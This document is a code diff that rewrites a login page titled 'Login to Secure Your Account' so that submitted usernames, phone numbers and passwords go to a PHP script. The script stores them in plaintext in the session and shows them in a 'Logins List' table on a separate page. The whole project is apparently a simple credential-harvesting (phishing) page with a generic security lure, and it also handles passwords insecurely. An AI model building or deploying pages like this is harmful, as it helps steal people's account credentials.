@@ -2,12 +2,13 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login to Secure your Account</title>
+    <title>Login to Secure Your Account</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #007BFF; /* Blue background */
+            background-color: white;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -15,57 +16,129 @@
             margin: 0;
         }
         .login-container {
-            background-color: white;
+            background-color: #f0f8ff; /* Light blue */
             padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             width: 300px;
+        }
+        .login-container h2 {
             text-align: center;
+            color: #007BFF; /* Blue text */
         }
-        h1 {
-            font-size: 20px;
-            margin-bottom: 20px;
-        }
-        input[type="text"], input[type="password"] {
+        .login-container input {
             width: 100%;
             padding: 10px;
             margin: 10px 0;
             border: 1px solid #ccc;
-            border-radius: 5px;
+            border-radius: 4px;
         }
-        input[type="submit"] {
+        .login-container button {
             width: 100%;
             padding: 10px;
             background-color: #007BFF;
-            color: white;
             border: none;
-            border-radius: 5px;
+            color: white;
+            border-radius: 4px;
             cursor: pointer;
         }
-        input[type="submit"]:hover {
+        .login-container button:hover {
             background-color: #0056b3;
         }
     </style>
 </head>
 <body>
+
     <div class="login-container">
-        <h1>Login to Secure your Account</h1>
-        <form id="loginForm">
-            <input type="text" id="username" placeholder="Username" required><br>
-            <input type="password" id="password" placeholder="Password" required><br>
-            <input type="submit" value="Login">
+        <h2>Login to Secure Your Account</h2>
+        <form method="POST" action="login.php">
+            <input type="text" name="username" placeholder="Username or Phone No." required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Login</button>
         </form>
     </div>
 
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            var username = document.getElementById('username').value;
-            var password = document.getElementById('password').value;
-            console.log("Username: " + username);
-            console.log("Password: " + password);
-            alert("Check the console to view the username and password.");
-        });
-    </script>
+</body>
+</html>
+<?php
+// Start session
+session_start();
+
+// Check if form was submitted
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = htmlspecialchars($_POST['username']);
+    $password = htmlspecialchars($_POST['password']);
+
+    // Save login details to session (in real-world scenarios, store in a database)
+    $_SESSION['logins'][] = [
+        'username' => $username,
+        'password' => $password
+    ];
+
+    // Redirect to a success page or back to the login
+    header("Location: view_logins.php");
+    exit();
+}
+?>
+<?php
+// Start session
+session_start();
+
+// Check if logins are set in the session
+$logins = isset($_SESSION['logins']) ? $_SESSION['logins'] : [];
+
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>View Logins</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: white;
+            padding: 20px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        table, th, td {
+            border: 1px solid #007BFF;
+        }
+        th, td {
+            padding: 10px;
+            text-align: left;
+        }
+        th {
+            background-color: #007BFF;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <h1>Logins List</h1>
+    <table>
+        <tr>
+            <th>Username/Phone No</th>
+            <th>Password</th>
+        </tr>
+        <?php if (count($logins) > 0): ?>
+            <?php foreach ($logins as $login): ?>
+                <tr>
+                    <td><?php echo $login['username']; ?></td>
+                    <td><?php echo $login['password']; ?></td>
+                </tr>
+            <?php endforeach; ?>
+        <?php else: ?>
+            <tr>
+                <td colspan="2">No logins yet.</td>
+            </tr>
+        <?php endif; ?>
+    </table>
 </body>
 </html>
